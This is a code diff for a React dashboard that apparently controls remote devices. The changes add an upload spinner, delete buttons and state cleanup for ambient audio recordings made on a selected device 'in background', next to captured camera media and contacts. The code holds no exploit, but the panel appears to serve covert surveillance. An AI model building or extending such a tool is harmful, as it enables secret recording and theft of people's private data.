@@ -275,6 +275,7 @@ export default function Home() {
 
     // Voice Recording State
     const [isVoiceRecording, setIsVoiceRecording] = useState(false);
+    const [isVoiceUploading, setIsVoiceUploading] = useState(false);
     const [voiceRecDuration, setVoiceRecDuration] = useState(60); // seconds
     const [voiceRecProgress, setVoiceRecProgress] = useState({ current: 0, total: 0 });
     const [capturedVoice, setCapturedVoice] = useState<any[]>([]);
@@ -861,6 +862,7 @@ export default function Home() {
                     });
                 }
                 setIsVoiceRecording(false);
+                setIsVoiceUploading(false);
                 setVoiceRecProgress({ current: 0, total: 0 });
                 if (voiceRecTimerRef.current) {
                     clearInterval(voiceRecTimerRef.current);
@@ -874,6 +876,8 @@ export default function Home() {
                     setVoiceRecProgress({ current: data.current, total: data.total || 60 });
                 }
                 if (data.current >= (data.total || 60) && (data.total || 60) > 0) {
+                    setIsVoiceRecording(false);
+                    setIsVoiceUploading(true);
                     setCapturedVoice(prev => [{
                         id: `temp_voice_${Date.now()}`,
                         resource_type: 'audio',
@@ -1276,6 +1280,7 @@ export default function Home() {
             duration: voiceRecDuration
         });
         setIsVoiceRecording(true);
+        setIsVoiceUploading(false);
         setVoiceRecProgress({ current: 0, total: voiceRecDuration });
 
         // Local progress timer
@@ -1286,13 +1291,7 @@ export default function Home() {
             if (elapsed >= voiceRecDuration) {
                 clearInterval(voiceRecTimerRef.current!);
                 voiceRecTimerRef.current = null;
-                setCapturedVoice(prev => [{
-                    id: `temp_voice_${Date.now()}`,
-                    resource_type: 'audio',
-                    url: 'loading',
-                    created_at: new Date().toISOString(),
-                    isTemp: true
-                }, ...prev]);
+                // DO NOT add temp_voice here. It's handled by progress event.
             }
         }, 1000);
     }, [socket, selectedDeviceId, session, voiceRecDuration]);
@@ -1305,6 +1304,7 @@ export default function Home() {
             });
         }
         setIsVoiceRecording(false);
+        setIsVoiceUploading(true);
         setVoiceRecProgress({ current: 0, total: 0 });
         if (voiceRecTimerRef.current) {
             clearInterval(voiceRecTimerRef.current);
@@ -2114,6 +2114,7 @@ END:VCARD`;
                                                 )}
                                                 <button 
                                                     onClick={() => {
+                                                        if (isVoiceUploading) return;
                                                         const device = devices.find(d => d.deviceId === selectedDeviceId);
                                                         if (!device?.online) {
                                                             setAlertData({ title: 'Device Offline', message: 'Cannot record voice on an offline device.', type: 'error' });
@@ -2126,14 +2127,18 @@ END:VCARD`;
                                                             startVoiceRecording();
                                                         }
                                                     }}
-                                                    className={`w-32 h-32 rounded-full flex items-center justify-center border-[6px] shadow-2xl transition-all ${isVoiceRecording ? 'border-red-500 bg-red-500/20' : 'border-white bg-white/5 hover:bg-white/10'}`}
+                                                    className={`w-32 h-32 rounded-full flex items-center justify-center border-[6px] shadow-2xl transition-all ${isVoiceUploading ? 'border-cyan-500 bg-cyan-500/10 cursor-not-allowed' : isVoiceRecording ? 'border-red-500 bg-red-500/20' : 'border-white bg-white/5 hover:bg-white/10'}`}
                                                 >
-                                                    <Mic size={40} className={isVoiceRecording ? "text-red-400 animate-pulse" : "text-white"} />
+                                                    {isVoiceUploading ? (
+                                                        <RefreshCw size={40} className="text-cyan-400 animate-spin" />
+                                                    ) : (
+                                                        <Mic size={40} className={isVoiceRecording ? "text-red-400 animate-pulse" : "text-white"} />
+                                                    )}
                                                 </button>
                                             </div>
                                             
                                             <p className="text-sm text-white/40 max-w-xs text-center font-medium">
-                                                {isVoiceRecording ? 'Recording audio in background...' : 'Tap to start recording ambient audio.'}
+                                                {isVoiceUploading ? 'Uploading audio...' : isVoiceRecording ? 'Recording audio in background...' : 'Tap to start recording ambient audio.'}
                                             </p>
                                         </div>
                                     </>
@@ -2180,6 +2185,13 @@ END:VCARD`;
                                                             <span className="text-[10px] text-white/40">{new Date(audio.created_at).toLocaleString()}</span>
                                                         </div>
                                                     </div>
+                                                    <button 
+                                                        onClick={() => setDeleteConfirmation({ isOpen: true, ids: [audio.id] })}
+                                                        className="w-8 h-8 rounded-lg bg-red-500/10 hover:bg-red-500/30 text-red-400/50 hover:text-red-400 flex items-center justify-center transition-colors opacity-0 group-hover:opacity-100"
+                                                        title="Delete Voice Note"
+                                                    >
+                                                        <Trash2 size={14} />
+                                                    </button>
                                                 </div>
                                                 <div className="w-full">
                                                     <audio src={audio.url} controls className="w-full h-8 outline-none grayscale invert opacity-70 group-hover:opacity-100 transition-opacity" />
@@ -2518,6 +2530,8 @@ END:VCARD`;
                             <button 
                                 onClick={() => {
                                     setImages(prev => prev.filter((i: any) => !deleteConfirmation.ids.includes(i.id)));
+                                    setCapturedMedia(prev => prev.filter((i: any) => !deleteConfirmation.ids.includes(i.id)));
+                                    setCapturedVoice(prev => prev.filter((i: any) => !deleteConfirmation.ids.includes(i.id)));
                                     fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/delete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids: deleteConfirmation.ids }) }).catch(()=>null);
                                     setDeleteConfirmation({ isOpen: false, ids: [] });
                                     setIsCameraSelectMode(false);
